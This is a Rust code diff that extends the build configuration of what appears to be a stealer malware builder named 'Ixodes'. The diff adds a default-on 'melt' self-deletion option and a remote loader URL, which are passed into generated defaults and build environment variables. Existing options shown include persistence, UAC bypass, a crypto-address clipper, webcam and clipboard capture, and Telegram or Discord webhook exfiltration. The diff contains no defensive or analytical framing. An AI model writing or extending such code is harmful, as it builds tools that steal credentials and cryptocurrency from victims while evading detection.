@@ -48,6 +48,8 @@ struct RecoverySettings {
     persistence: Option<bool>,
     uac_bypass: Option<bool>,
     clipper: Option<bool>,
+    melt: Option<bool>,
+    loader_url: Option<String>,
     btc_address: Option<String>,
     eth_address: Option<String>,
     ltc_address: Option<String>,
@@ -139,6 +141,15 @@ fn render_defaults_rs(settings: &RecoverySettings) -> Result<String, String> {
     let default_persistence = settings.persistence.unwrap_or(false);
     let default_uac_bypass = settings.uac_bypass.unwrap_or(false);
     let default_clipper = settings.clipper.unwrap_or(false);
+    let default_melt = settings.melt.unwrap_or(true);
+
+    let default_loader_url = settings
+        .loader_url
+        .as_deref()
+        .map(str::trim)
+        .filter(|v| !v.is_empty())
+        .map(|v| format!("Some(\"{}\")", escape_rust_string(v)))
+        .unwrap_or_else(|| "None".to_string());
 
     let default_btc = settings.btc_address.as_deref().map(escape_rust_string);
     let default_eth = settings.eth_address.as_deref().map(escape_rust_string);
@@ -247,6 +258,8 @@ pub static DEFAULT_CAPTURE_CLIPBOARD: bool = {default_capture_clipboard};
 pub static DEFAULT_PERSISTENCE: bool = {default_persistence};
 pub static DEFAULT_UAC_BYPASS: bool = {default_uac_bypass};
 pub static DEFAULT_CLIPPER_ENABLED: bool = {default_clipper};
+pub static DEFAULT_MELT_ENABLED: bool = {default_melt};
+pub static DEFAULT_LOADER_URL: Option<&str> = {default_loader_url};
 pub static DEFAULT_BTC_ADDRESS: Option<&str> = {default_btc_val};
 pub static DEFAULT_ETH_ADDRESS: Option<&str> = {default_eth_val};
 pub static DEFAULT_LTC_ADDRESS: Option<&str> = {default_ltc_val};
@@ -270,6 +283,11 @@ pub static DEFAULT_DISCORD_WEBHOOK: Option<&str> = {default_discord_webhook};
         default_capture_webcams = default_capture_webcams,
         default_capture_clipboard = default_capture_clipboard,
         default_persistence = default_persistence,
+        default_uac_bypass = default_uac_bypass,
+        default_clipper = default_clipper,
+        default_melt = default_melt,
+        default_loader_url = default_loader_url,
+        default_btc_val = default_btc_val,
         default_pump_size_mb = default_pump_size_mb,
         default_blocked_countries = default_blocked_countries,
         default_custom_extensions = default_custom_extensions,
@@ -345,7 +363,21 @@ fn build_ixodes_sync(app: AppHandle, request: BuildRequest) -> Result<BuildResul
         .env(
             "IXODES_PASSWORD",
             request.settings.archive_password.as_deref().unwrap_or(""),
+        )
+        .env(
+            "IXODES_MELT",
+            if request.settings.melt.unwrap_or(true) {
+                "true"
+            } else {
+                "false"
+            },
         );
+
+    if let Some(url) = &request.settings.loader_url {
+        if !url.is_empty() {
+            command.env("IXODES_LOADER_URL", url);
+        }
+    }
 
     if let Some(token) = &request.settings.telegram_token {
         if !token.is_empty() {
